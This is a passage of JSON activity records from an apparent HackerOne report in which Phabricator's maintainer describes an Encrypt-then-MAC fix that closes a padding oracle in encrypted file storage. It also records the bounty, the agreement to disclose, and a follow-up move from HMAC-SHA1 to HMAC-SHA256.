class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eBriefly, I\u0026#39;ve implemented Encrypt-then-MAC for encrypted files, hashing both the encrypted data and the IV to generate an integrity hash. Unencrypted files also get a basic integrity hash of the file data.\u003c/p\u003e\n\n\u003cp\u003eIn both cases, we refuse to decrypt or serve file data if the stored integrity hash does not match a freshly computed integrity hash after we perform a read from the underlying storage engine, so execution never reaches the decryption step and the process can no longer serve as a padding oracle.\u003c/p\u003e\n\n\u003cp\u003eI plan to make some other followup changes (like providing CLI tools for related maintenance) and we\u0026#39;ll offer further guidance in the weekly changelog, but none of the additional work needs to hold up resolving this issue.\u003c/p\u003e\n\n\u003cp\u003eIf you have a chance to review the fix, please let us know if you catch any issues with it.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-05T19:11:29.754Z","updated_at":"2017-04-05T19:11:29.754Z","actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1585641,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Per above, this is now fixed in HEAD of `master`.","markdown_message":"\u003cp\u003ePer above, this is now fixed in HEAD of \u003ccode\u003emaster\u003c/code\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-05T19:11:54.917Z","updated_at":"2017-04-05T19:11:54.917Z","actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"edoverflow","url":"/edoverflow"},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1585662,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Although the severity of this issue isn't especially high, I'm also considering the work that went into discussing this report and helping to develop an understanding of the issue in assessing an award.","markdown_message":"\u003cp\u003eAlthough the severity of this issue isn\u0026#39;t especially high, I\u0026#39;m also considering the work that went into discussing this report and helping to develop an understanding of the issue in assessing an award.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-05T19:19:02.572Z","updated_at":"2017-04-05T19:19:02.572Z","actor":{"url":"/phabricator","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/018/61446f7e6f0684c8c9f7c36c918b7ecd58183588_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Phabricator"}},"bounty_amount":"750.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"phabricator","collaborator":{"username":"edoverflow","url":"/edoverflow"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1585666,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Details of this issue are now publicly available in the upstream bug tracker and commit history, so it can be disclosed at any time.","markdown_message":"\u003cp\u003eDetails of this issue are now publicly available in the upstream bug tracker and commit history, so it can be disclosed at any time.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-05T19:19:38.270Z","updated_at":"2017-04-05T19:19:38.270Z","first_to_agree":true,"actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1585692,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Also, thanks for your patience while the issue was resolved -- we try to turn fixes around much faster than this, but this was a bit of an unusual case with some competing priorities and a technical pathway partially blocked by some other outstanding bugs.\n\nLet us know if you catch anything I missed or find any other issues in the future. Thanks again!","markdown_message":"\u003cp\u003eAlso, thanks for your patience while the issue was resolved -- we try to turn fixes around much faster than this, but this was a bit of an unusual case with some competing priorities and a technical pathway partially blocked by some other outstanding bugs.\u003c/p\u003e\n\n\u003cp\u003eLet us know if you catch anything I missed or find any other issues in the future. Thanks again!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-05T19:25:14.784Z","updated_at":"2017-04-05T19:25:14.784Z","actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1585733,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you very much for the bounty! It was a pleasure to work with you. I will give you a shout-out on Twitter and let everyone know that you did a fantastic job.\n\nI had a look at the patch and I have one quick question. Are you using [SHA-1](https://github.com/phacility/phabricator/blob/master/src/infrastructure/util/PhabricatorHash.php#L25) for the digest algorithm? While I know that HMAC-SHA-1 is not broken, I would still be inclined to use HMAC-SHA-256. \n\nP.S.: I like the fact that you also check unencrypted files.","markdown_message":"\u003cp\u003eThank you very much for the bounty! It was a pleasure to work with you. I will give you a shout-out on Twitter and let everyone know that you did a fantastic job.\u003c/p\u003e\n\n\u003cp\u003eI had a look at the patch and I have one quick question. Are you using \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fphacility%2Fphabricator%2Fblob%2Fmaster%2Fsrc%2Finfrastructure%2Futil%2FPhabricatorHash.php%23L25\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eSHA-1\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e for the digest algorithm? While I know that HMAC-SHA-1 is not broken, I would still be inclined to use HMAC-SHA-256. \u003c/p\u003e\n\n\u003cp\u003eP.S.: I like the fact that you also check unencrypted files.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-05T19:51:18.875Z","updated_at":"2017-04-05T19:51:18.875Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1585759,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yeah, `PhabricatorHash::digest()` is still HMAC-SHA1. While working toward this I removed our remaining non-HMAC use of SHA1 (\u003chttps://secure.phabricator.com/D17619\u003e) in favor of SHA-256 (\u003chttps://secure.phabricator.com/D17620\u003e, etc.) but we still have a fair amount of HMAC SHA1.\n\nIt's maybe worth trying to introduce a new HMAC-SHA256 method here, but it's potentially somewhat involved. I also don't like our current handling of `security.hmac-key`, and introducing HMCA-SHA256 would potentially let us fix that.\n\nI'll file something upstream and try to take a better look at this soon. I don't think any of this stuff is going to turn into a security vulnerability for a while unless a dramatic vulnerability is discovered in HMAC SHA1 overnight, but it would be good to at least have a more specific plan in place for moving away from SHA1.","markdown_message":"\u003cp\u003eYeah, \u003ccode\u003ePhabricatorHash::digest()\u003c/code\u003e is still HMAC-SHA1. While working toward this I removed our remaining non-HMAC use of SHA1 (\u003ca title=\"https://secure.phabricator.com/D17619\" href=\"/redirect?url=https%3A%2F%2Fsecure.phabricator.com%2FD17619\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://secure.phabricator.com/D17619\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e) in favor of SHA-256 (\u003ca title=\"https://secure.phabricator.com/D17620\" href=\"/redirect?url=https%3A%2F%2Fsecure.phabricator.com%2FD17620\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://secure.phabricator.com/D17620\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, etc.) but we still have a fair amount of HMAC SHA1.\u003c/p\u003e\n\n\u003cp\u003eIt\u0026#39;s maybe worth trying to introduce a new HMAC-SHA256 method here, but it\u0026#39;s potentially somewhat involved. I also don\u0026#39;t like our current handling of \u003ccode\u003esecurity.hmac-key\u003c/code\u003e, and introducing HMCA-SHA256 would potentially let us fix that.\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;ll file something upstream and try to take a better look at this soon. I don\u0026#39;t think any of this stuff is going to turn into a security vulnerability for a while unless a dramatic vulnerability is discovered in HMAC SHA1 overnight, but it would be good to at least have a more specific plan in place for moving away from SHA1.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-05T20:09:10.888Z","updated_at":"2017-04-05T20:09:10.888Z","actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1585766,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Great! In that case, everything looks good to me and I look forward to working with you again in the future.","markdown_message":"\u003cp\u003eGreat! In that case, everything looks good to me and I look forward to working with you again in the future.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-05T20:16:10.722Z","updated_at":"2017-04-05T20:16:10.722Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1585767,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-04-05T20:16:10.763Z","updated_at":"2017-04-05T20:16:10.763Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1588243,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"As a followup, we switched to HMAC-SHA256 for integrity hashing, and have taken initial steps to move away from HMAC-SHA1 in other cases. For details, see:\n\n  - Replacing HMAC-SHA1: \u003chttps://secure.phabricator.com/T12509\u003e\n  - Upgrade guidance for integrity hashing: \u003chttps://secure.phabricator.com/T12515\u003e","markdown_message":"\u003cp\u003eAs a followup, we switched to HMAC-SHA256 for integrity hashing, and have taken initial steps to move away from HMAC-SHA1 in other cases. For details, see:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eReplacing HMAC-SHA1: \u003ca title=\"https://secure.phabricator.com/T12509\" href=\"/redirect?url=https%3A%2F%2Fsecure.phabricator.com%2FT12509\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://secure.phabricator.com/T12509\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003eUpgrade guidance for integrity hashing: \u003ca title=\"https://secure.phabricator.com/T12515\" href=\"/redirect?url=https%3A%2F%2Fsecure.phabricator.com%2FT12515\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://secure.phabricator.com/T12515\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n","automated_response":false,"created_at":"2017-04-06T23:27:19.856Z","updated_at":"2017-04-06T23:27:19.856Z","actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1590639,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for keeping me informed. Interestingly, as [siepkes](https://secure.phabricator.com/p/siepkes/) pointed out, SHA-512 will perform better on a 64-bit CPU.\n\n\u003e Piece of info (you guys might already be aware of it) which might be of interest when implementing this; SHA512 is often faster then SHA256 on x64. See for example: https://crypto.stackexchange.com/questions/26336/sha512-faster-than-sha256\n\nOn a side note, if anyone reading this report is interested in learning more about the SHA-2 family, I wrote a piece in Laurens Van Houtven's fantastic book \"[Crypto 101](https://github.com/crypto101/book/blob/master/Crypto101.org#sha-2)\".","markdown_message":"\u003cp\u003eThank you for keeping me informed. Interestingly, as \u003ca href=\"/redirect?url=https%3A%2F%2Fsecure.phabricator.com%2Fp%2Fsiepkes%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003esiepkes\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e pointed out, SHA-512 will perform better on a 64-bit CPU.\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003ePiece of info (you guys might already be aware of it) which might be of interest when implementing this; SHA512 is often faster then SHA256 on x64. See for example: \u003ca title=\"https://crypto.stackexchange.com/questions/26336/sha512-faster-than-sha256\" href=\"/redirect?url=https%3A%2F%2Fcrypto.stackexchange.com%2Fquestions%2F26336%2Fsha512-faster-than-sha256\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://crypto.stackexchange.com/questions/26336/sha512-faster-than-sha256\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eOn a side note, if anyone reading this report is interested in learning more about the SHA-2 family, I wrote a piece in Laurens Van Houtven\u0026#39;s fantastic book \u0026quot;\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fcrypto101%2Fbook%2Fblob%2Fmaster%2FCrypto101.org%23sha-2\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eCrypto 101\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u0026quot;.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-08T08:27:16.588Z","updated_at":"2017-04-08T08:27:16.588Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}